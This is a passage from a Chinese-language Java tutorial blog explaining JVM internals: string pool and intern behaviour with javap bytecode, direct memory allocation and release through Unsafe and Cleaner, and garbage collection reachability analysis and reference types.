<h6 id="StringTable示例2："><a href="#StringTable示例2：" class="headerlink" title="StringTable示例2："></a>StringTable示例2：</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringTableStudy</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		String a = <span class="string">"a"</span>; </span><br><span class="line">		String b = <span class="string">"b"</span>;</span><br><span class="line">		String ab = <span class="string">"ab"</span>;</span><br><span class="line">		<span class="comment">//拼接字符串对象来创建新的字符串</span></span><br><span class="line">		String ab2 = a+b; <span class="comment">//分析此行</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>javap -v StringTableStudy.class</code>反编译结果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Code:</span><br><span class="line">      stack=<span class="number">2</span>, locals=<span class="number">5</span>, args_size=<span class="number">1</span></span><br><span class="line">         0: ldc           #2                  // String a</span><br><span class="line">         <span class="number">2</span>: astore_1</span><br><span class="line">         3: ldc           #3                  // String b</span><br><span class="line">         <span class="number">5</span>: astore_2</span><br><span class="line">         6: ldc           #4                  // String ab</span><br><span class="line">         <span class="number">8</span>: astore_3</span><br><span class="line">         9: new           #5                  // class java/lang/StringBuilder</span><br><span class="line">        <span class="number">12</span>: dup</span><br><span class="line">        13: invokespecial #6                  // Method java/lang/StringBuilder."&lt;init&gt;":()V</span><br><span class="line">        <span class="number">16</span>: aload_1</span><br><span class="line">        17: invokevirtual #7                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line">        <span class="number">20</span>: aload_2</span><br><span class="line">        21: invokevirtual #7                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line">        24: invokevirtual #8                  // Method java/lang/StringBuilder.toString:()Ljava/lang/String;</span><br><span class="line">        <span class="number">27</span>: astore        <span class="number">4</span></span><br><span class="line">        <span class="number">29</span>: <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
<p>只分析最后一行代码</p>
<ul>
<li>9: new #5  new一个StringBuilder对象</li>
<li>13: invokespecial #6  执行StringBuilder的构造方法</li>
<li>16: aload_1加载 参数astore_1</li>
<li>17: invokevirtual #7 调用append方法</li>
<li>20: aload_2 加载 参数astore_2</li>
<li>21: invokevirtual #7 调用append方法</li>
<li>24: invokevirtual #8  toString()方法，new一个在堆内存的对象</li>
<li>27: astore        4 把toString()的对象存储</li>
</ul>
<p><code>String ab2 = a+b;</code> 创建字符串的过程是 <code>StringBuilder().append(“a”).append(“b”).toString()</code></p>
<p>再看代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringTableStudy</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String a = <span class="string">"a"</span>; </span><br><span class="line">        String b = <span class="string">"b"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//存放在串池中</span></span><br><span class="line">        String ab = <span class="string">"ab"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">//存放在堆内存</span></span><br><span class="line">        <span class="comment">//StringBuilder().append(“a”).append(“b”).toString()</span></span><br><span class="line">        String ab2 = a+b;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//结果是false，因为两者的存放位置不同</span></span><br><span class="line">        System.out.println(ab == ab2);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="StringTable示例3："><a href="#StringTable示例3：" class="headerlink" title="StringTable示例3："></a>StringTable示例3：</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringTableStudy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String a = <span class="string">"a"</span>;</span><br><span class="line">        String b = <span class="string">"b"</span>;</span><br><span class="line">        String ab = <span class="string">"ab"</span>;</span><br><span class="line">        String ab2 = a+b;</span><br><span class="line">        String ab3 = <span class="string">"a"</span> + <span class="string">"b"</span>; <span class="comment">//分析此行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>javap -v StringTableStudy.class</code>反编译结果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Code:</span><br><span class="line">      stack=<span class="number">2</span>, locals=<span class="number">6</span>, args_size=<span class="number">1</span></span><br><span class="line">         0: ldc           #2                  // String a</span><br><span class="line">         <span class="number">2</span>: astore_1</span><br><span class="line">         3: ldc           #3                  // String b</span><br><span class="line">         <span class="number">5</span>: astore_2</span><br><span class="line">         6: ldc           #4                  // String ab</span><br><span class="line">         <span class="number">8</span>: astore_3</span><br><span class="line">         9: new           #5                  // class java/lang/StringBuilder</span><br><span class="line">        <span class="number">12</span>: dup</span><br><span class="line">        13: invokespecial #6                  // Method java/lang/StringBuilder."&lt;init&gt;":()V</span><br><span class="line">        <span class="number">16</span>: aload_1</span><br><span class="line">        17: invokevirtual #7                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line">        <span class="number">20</span>: aload_2</span><br><span class="line">        21: invokevirtual #7                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line">        24: invokevirtual #8                  // Method java/lang/StringBuilder.toString:()Ljava/lang/String;</span><br><span class="line">        <span class="number">27</span>: astore        <span class="number">4</span></span><br><span class="line">        29: ldc           #4                  // String ab</span><br><span class="line">        <span class="number">31</span>: astore        <span class="number">5</span></span><br><span class="line">        <span class="number">33</span>: <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
<p>直接看 <code>29: ldc</code> ：javac在编译期会进行优化，结果已在编译期确定为ab，而创建ab的时候已经在串池中放入了字符串“ab”，所以ab3直接从串池中获取值，所以进行的操作和 ab = “ab” 一致。</p>
<h5 id="5-4-2-intern方法"><a href="#5-4-2-intern方法" class="headerlink" title="5.4.2 intern方法"></a>5.4.2 intern方法</h5><p>调用字符串对象的intern方法，主动将串池中还没有的字符串对象放入到串池。</p>
<p>intern示例1：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//"a" "b" 被放入串池中，s则存在于堆内存之中</span></span><br><span class="line">        String s = <span class="keyword">new</span> String(<span class="string">"a"</span>) + <span class="keyword">new</span> String(<span class="string">"b"</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//尝试将堆中s对象放入串池，</span></span><br><span class="line">        <span class="comment">//串池中如果已存在此字符串并不会放入;</span></span><br><span class="line">        <span class="comment">//串池中如果不存在此字符串则会放入串池，并把串池中的对象返回;</span></span><br><span class="line">        <span class="comment">//此时串池中没有"ab"，则s会放入到串池，并返回给s2</span></span><br><span class="line">        String s2 = s.intern();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//s3赋值，因为此时串池中已有"ab"，则直接将串池中的内容返回</span></span><br><span class="line">        String s3 = <span class="string">"ab"</span>;</span><br><span class="line">        <span class="comment">//因为堆内存与串池中的"ab"是同一个对象，所以以下两条语句打印的都为true</span></span><br><span class="line">        System.out.println(str == st2);</span><br><span class="line">        System.out.println(str == str3);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>intern示例2：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//"ab"被放入串池中</span></span><br><span class="line">        String x = <span class="string">"ab"</span>;</span><br><span class="line">        <span class="comment">//"a" "b" 被放入串池中，s则存在于堆内存之中</span></span><br><span class="line">        String s = <span class="keyword">new</span> String(<span class="string">"a"</span>) + <span class="keyword">new</span> String(<span class="string">"b"</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//尝试将堆中s对象放入串池，</span></span><br><span class="line">        <span class="comment">//串池中已有"ab"，则s不会放入到串池(s依然是堆中的对象)，并返回串池中的"ab"给s2</span></span><br><span class="line">        String s2 = s.intern();</span><br><span class="line">        </span><br><span class="line">        System.out.println(s2 == x);<span class="comment">//true</span></span><br><span class="line">        System.out.println(s == x); <span class="comment">//false，堆 != 串池</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>intern在JDK1.8和1.6上的区别：</p>
<ul>
<li><p>1.8 </p>
<p>将字符串对象尝试放入串池，如已存在则不放入，会把串池中的对象返回；如不存在则<strong>把对象</strong>放入串池，会把串池中的对象返回</p>
</li>
<li><p>1.6</p>
<p>将字符串对象尝试放入串池，如已存在则不放入，会把串池中的对象返回；如不存在则<strong>把对象复制一份</strong>放入串池，会把串池中的对象返回</p>
</li>
</ul>
<h5 id="5-4-3-StringTable的位置"><a href="#5-4-3-StringTable的位置" class="headerlink" title="5.4.3  StringTable的位置"></a>5.4.3  StringTable的位置</h5><p><img src="/images/java/jvm/StringTable的位置.png" alt></p>
<ul>
<li>1.8 在堆内存中 (回收效率高)</li>
<li>1.6 在永久代PermGen (触发垃圾回收时间晚，回收效率不高)</li>
</ul>
<h5 id="5-4-4-StringTable垃圾回收"><a href="#5-4-4-StringTable垃圾回收" class="headerlink" title="5.4.4 StringTable垃圾回收"></a>5.4.4 StringTable垃圾回收</h5><p>​    StringTable在内存紧张时，会发生垃圾回收</p>
<h5 id="5-4-5-StringTable调优"><a href="#5-4-5-StringTable调优" class="headerlink" title="5.4.5 StringTable调优"></a>5.4.5 StringTable调优</h5><ul>
<li><p>因为StringTable是由HashTable实现的，所以可以<strong>适当增加HashTable桶的个数</strong>，来减少字符串放入串池所需要的时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-XX:StringTableSize=xxxx</span><br></pre></td></tr></table></figure>
</li>
<li><p>考虑是否需要将字符串对象入池</p>
<p>可以通过<strong>intern方法减少重复入池</strong></p>
</li>
</ul>
<h3 id="6、直接内存"><a href="#6、直接内存" class="headerlink" title="6、直接内存"></a>6、直接内存</h3><ul>
<li>常见于NIO操作时，用于数据缓冲区</li>
<li>分配回收成本较高，但读写性能高</li>
<li>不受JVM内存回收管理</li>
</ul>
<p><strong>JVM常规</strong>文件IO流程(要调用“操作系统方法”操作IO)</p>
<p><img src="/images/java/jvm/直接内存1.png" alt></p>
<p><strong>JVM直接内存</strong>文件IO流程(直接操作IO)</p>
<p><img src="/images/java/jvm/直接内存2.png" alt></p>
<p>直接内存是操作系统和Java代码<strong>都可以访问的一块区域</strong>，无需将代码从系统内存复制到Java堆内存，从而提高了效率。</p>
<p>直接内存溢出：<code>java.lang.OutOfMemoryError:Direct buffer memory</code></p>
<p><strong>直接内存分配</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> _1M = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"><span class="comment">//通过ByteBuffer申请1M的直接内存</span></span><br><span class="line">ByteBuffer byteBuffer = ByteBuffer.allocateDirect(_1M);</span><br></pre></td></tr></table></figure>
<p><strong>直接内存释放</strong></p>
<p>JVM并不能回收直接内存中的内容，它是如何实现回收的呢？看分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接内存示例</span></span><br><span class="line"><span class="comment">//Windows上要通过任务管理器查看内存情况</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> _1G = <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ByteBuffer byteBuffer = ByteBuffer.allocateDirect(_1G);</span><br><span class="line">        System.out.println(<span class="string">"分配直接内存完毕"</span>);</span><br><span class="line">        System.in.read();</span><br><span class="line">        System.out.println(<span class="string">"开始释放直接内存"</span>);</span><br><span class="line">        byteBuffer = <span class="keyword">null</span>;</span><br><span class="line">        System.gc();<span class="comment">//显示垃圾回收，Full GC</span></span><br><span class="line">        System.in.read();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ByteBuffer.allocateDirect()</code> 这个方法的实现是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Allocates a new direct byte buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt; The new buffer's position will be zero, its limit will be its</span></span><br><span class="line"><span class="comment"> * capacity, its mark will be undefined, each of its elements will be</span></span><br><span class="line"><span class="comment"> * initialized to zero, and its byte order will be</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> ByteOrder#BIG_ENDIAN BIG_ENDIAN&#125;.  Whether or not it has a</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #hasArray backing array&#125; is unspecified.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  capacity</span></span><br><span class="line"><span class="comment"> *         The new buffer's capacity, in bytes</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The new byte buffer</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  IllegalArgumentException</span></span><br><span class="line"><span class="comment"> *          If the &#123;<span class="doctag">@code</span> capacity&#125; is a negative integer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">allocateDirect</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> DirectByteBuffer(capacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而 <code>DirectByteBuffer</code> 类构造函数实现是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Primary constructor</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">DirectByteBuffer(<span class="keyword">int</span> cap) &#123;                   <span class="comment">// package-private</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">super</span>(-<span class="number">1</span>, <span class="number">0</span>, cap, cap);</span><br><span class="line">    <span class="keyword">boolean</span> pa = VM.isDirectMemoryPageAligned();</span><br><span class="line">    <span class="keyword">int</span> ps = Bits.pageSize();</span><br><span class="line">    <span class="keyword">long</span> size = Math.max(<span class="number">1L</span>, (<span class="keyword">long</span>)cap + (pa ? ps : <span class="number">0</span>));</span><br><span class="line">    Bits.reserveMemory(size, cap);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//申请内存</span></span><br><span class="line">        base = UNSAFE.allocateMemory(size); </span><br><span class="line">    &#125; <span class="keyword">catch</span> (OutOfMemoryError x) &#123;</span><br><span class="line">        Bits.unreserveMemory(size, cap);</span><br><span class="line">        <span class="keyword">throw</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    UNSAFE.setMemory(base, size, (<span class="keyword">byte</span>) <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (pa &amp;&amp; (base % ps != <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="comment">// Round up to page boundary</span></span><br><span class="line">        address = base + ps - (base &amp; (ps - <span class="number">1</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        address = base;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Cleaner是虚引用类型 PhantomReference&lt;Object&gt;</span></span><br><span class="line">    <span class="comment">//特点：当所关联的对象被回收，Cleaner会触发clean()方法</span></span><br><span class="line">    <span class="comment">//这里关联的是对象this就是DirectByteBuffer,当DirectByteBuffer被回收触发Cleaner.clean()</span></span><br><span class="line">    cleaner = Cleaner.create(<span class="keyword">this</span>, <span class="keyword">new</span> Deallocator(base, size, cap));</span><br><span class="line">    att = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Deallocator回调任务</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Deallocator</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">long</span> address;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">long</span> size;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> capacity;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">Deallocator</span><span class="params">(<span class="keyword">long</span> address, <span class="keyword">long</span> size, <span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">assert</span> (address != <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">this</span>.address = address;</span><br><span class="line">            <span class="keyword">this</span>.size = size;</span><br><span class="line">            <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (address == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// Paranoia</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//释放直接内存</span></span><br><span class="line">            UNSAFE.freeMemory(address);</span><br><span class="line">            address = <span class="number">0</span>;</span><br><span class="line">            Bits.unreserveMemory(size, capacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>Cleaner.clean()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Runs this cleaner, if it has not been run before.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!remove(<span class="keyword">this</span>))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//调用run方法，也就是上面的回调任务Deallocator.run()方法</span></span><br><span class="line">        thunk.run();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Throwable x) &#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (System.err != <span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">new</span> Error(<span class="string">"Cleaner terminated abnormally"</span>, x)</span><br><span class="line">                    .printStackTrace();</span><br><span class="line">                System.exit(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总结：</p>
<ul>
<li>使用了 <code>Unsafe</code> 对象完成直接内存的分配回收，并且回收需要主动调用 <code>Unsafe.freeMemory()</code> 方法</li>
<li><code>ByteBuffer</code> 的实现类内部，使用了Cleaner(虚引用)来监测 <code>ByteBuffer</code> 对象，<code>ByteBuffer</code> 对象被垃圾回收时会由 <code>ReferenecHandler</code> 后台线程通过<code>Cleaner.clean()</code>方法调用<code>Unsafe.freeMemory()</code>释放直接内存。</li>
</ul>
<blockquote>
<p>注意：<code>-XX:+DisableExplicitGC</code> 这个参数可以关闭 ”System.gc() 显式垃圾回收“ （在JVM调优会用），这样会导致以上分析的案例中，直接内存无法释放。</p>
<p>这种情况则需要自己主动通过 <code>unsafe.freeMemory(address);</code>来主动释放</p>
</blockquote>
<p>上面这么复杂的直接内存分配和释放，其实就是Unsafe的两个方法，为了更加直观理解底层，请看一下示例: </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> _1G = <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Unsafe unsafe = getUnsafe();</span><br><span class="line">        <span class="keyword">long</span> base = unsafe.allocateMemory(_1G);</span><br><span class="line">        unsafe.setMemory(base,_1G,(<span class="keyword">byte</span>)<span class="number">0</span>);</span><br><span class="line">        System.out.println(<span class="string">"分配直接内存完毕"</span>);</span><br><span class="line">        System.in.read();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"开始释放直接内存"</span>);</span><br><span class="line">        unsafe.freeMemory(base);</span><br><span class="line">        System.in.read();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 不建议这么获取并使用Unsafe，这里只是为了演示测试</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title">getUnsafe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field f = Unsafe.class.getDeclaredField("theUnsafe");</span><br><span class="line">            f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Unsafe unsafe = (Unsafe)f.get(<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> unsafe;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="三、垃圾回收"><a href="#三、垃圾回收" class="headerlink" title="三、垃圾回收"></a>三、垃圾回收</h2><p>Java 垃圾回收主要关注的是 <strong>堆内存</strong></p>
<h3 id="1、如何判断对象可以回收"><a href="#1、如何判断对象可以回收" class="headerlink" title="1、如何判断对象可以回收?"></a>1、如何判断对象可以回收?</h3><h4 id="1-1-引用计数法"><a href="#1-1-引用计数法" class="headerlink" title="1.1 引用计数法"></a>1.1 引用计数法</h4><p>给对象添加一引用计数器，被引用一次计数器值就加 1；当引用失效时，计数器值就减 1；计数器为 0 时，对象就可以垃圾回收，简单高效。</p>
<p>弊端：循环引用时，两个对象的计数都为1，导致两个对象都无法被释放。所以Java虚拟机垃圾回收没有采用计数法。</p>
<p><img src="/images/java/jvm/循环引用.png" alt></p>
<h4 id="1-2-可达性分析法"><a href="#1-2-可达性分析法" class="headerlink" title="1.2 可达性分析法"></a>1.2 可达性分析法</h4><ul>
<li><p>Java虚拟机中垃圾回收器采用可达性分析法来探索所有存活的对象</p>
</li>
<li><p>扫描<strong>“堆”</strong>中的对象，看是否能够沿着 <code>GC Roots</code> 对象为起点的<strong>引用链接</strong>找到该对象，找不到表示可以回收。</p>
</li>
<li><p>那些对象可以作为 <code>GC Roots</code> ？<code>Menory Analyzer(MAT)</code> 这个软件可以帮助分析。</p>
<ul>
<li>虚拟机栈（栈帧中的本地变量表）中引用的对象。　</li>
<li>方法区中类静态属性引用的对象</li>
<li>方法区中常量引用的对象</li>
<li>本地方法栈中JNI（Native方法）引用的对象</li>
</ul>
<p><img src="/images/java/jvm/GC_Roots.png" alt></p>
</li>
</ul>
<h4 id="1-3-四种引用（强、软、弱、虚）"><a href="#1-3-四种引用（强、软、弱、虚）" class="headerlink" title="1.3 四种引用（强、软、弱、虚）"></a>1.3 四种引用（强、软、弱、虚）</h4><blockquote>
<p>JDK1.2 以前，一个对象只有被引用和没有被引用两种状态。<br>后来，Java 对引用的概念进行了扩充，将引用分为强引用（Strong Reference）、软引用（Soft Reference）、弱引用（Weak Reference）、虚引用（Phantom Reference）4 种，这 4 种引用强度依次逐渐减弱。</p>
</blockquote>
<p><img src="/images/java/jvm/垃圾回收五种引用.png" alt></p>
<p><strong>强引用</strong></p>
<p>指在程序代码之中普遍存在的，类似<code>“Object obj = new Object()”</code>这类的引用。</p>
<p>特点：只有 <code>GC Root</code> <strong>全部都不引用</strong>该对象时，才会回收<strong>强引用</strong>对象。</p>
<p>如上图：B、C对象都不引用A1对象时，A1对象才会被回收。</p>
<p><strong>软引用</strong></p>
<p>指还有用但并非必需的对象，内存不足会回收，类似<code>“SoftReference&lt;Object&gt; object = new SoftReference&lt;Object&gt;()”</code>这类的引用。</p>
<p>特点：仅有软引用引用该对象时，发生垃圾回收后，如果仍然内存不足会再次触发“垃圾回收”回收软引用对象。</p>
<p><img src="/images/java/jvm/垃圾回收软引用.png" alt></p>
<p>如上图：B对象 不再“强引用” A2对象，发生垃圾回收且内存不足时，G对象 “软引用”的 A2对象 就会被垃圾回收。</p>
<p><strong>弱引用</strong></p>
<p>和“软引用”很相似，区别在于：无论内存是否足够，都会被回收掉。类似<code>“WeakReference&lt;Object&gt; object = new WeakReference&lt;Object&gt;()”</code>这类的引用。</p>
<p>特点：发生垃圾回收时，无论内存是否充足，都会回收掉弱引用。</p>
<p><img src="/images/java/jvm/垃圾回收弱引用.png" alt></p>
<p>如上图: 如果 B对象 不再强引用 A3对象，只有C对象弱引用 A3对象，发生垃圾回收时，则A3对象会被回收。</p>
<p><strong>虚引用</strong></p>
<p>当虚引用对象所引用的对象被回收以后，虚引用对象就会被放入引用队列中，由Reference Handler 线程调用虚引用相关发发是否内存。声明<code>“PhantomReference&lt;Object&gt;”</code> 。</p>
<p>虚引用的一个体现是<strong>释放“直接内存”所分配的内存</strong>，当引用的对象ByteBuffer被垃圾回收以后，虚引用对象Cleaner就会被放入引用队列中，然后调用Cleaner的clean方法来释放直接内存。</p>
<blockquote>
<p>虚引用是最弱的一种引用关系。 <strong>无法通过虚引用来取得一个对象实例</strong> 。为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知。</p>
</blockquote>
<p><strong>终结器引用</strong></p>
<p>所有的类都继承自Object类，Object类有一个finalize方法。当发生垃圾回收时，某个对象不再被<strong>其他的对象</strong>所引用时，会先将<strong>终结器引用</strong>对象放入<strong>引用队列</strong>中，然后根据<strong>终结器引用对象</strong>找到它所引用的对象，然后调用该对象的finalize方法。调用以后，该对象就可以在下一次垃圾回收发生时被回收。</p>
<p>特点：</p>
<p>无需手动编码，但其内部配合引用队列使用，在垃圾回收时，终结器引用入队(被引用对象暂时没有被回收)，再由Finalizer线程通过终结器引用找到引用对象并调用它的finalize方法，下次GC时才能回收被引用对象。</p>
<blockquote>
<p>回收优先级低，不推荐使用终结器引用。</p>
</blockquote>
<p><img src="/images/java/jvm/垃圾回收终结器引用.png" alt></p>
<p>如上图：B对象不再引用A4对象。这时终结器引用对象就会被放入引用队列中（对象还没有被回收），引用队列会根据它，找到它所引用的对象A4，然后调用被引用对象的finalize方法，调用完成以后，该对象就可以在下次垃圾回收被回收。</p>
<p><strong>示例</strong></p>
<p>软引用示例：</p>
<p><img src="/images/java/jvm/软引用-示例代码.png" alt></p>
<p>清理软引用示例：</p>
<p><img src="/images/java/jvm/软引用清理-示例代码.png" alt></p>
<p>弱引用示例：</p>
<p><img src="/images/java/jvm/弱引用-示例代码.png" alt></p>
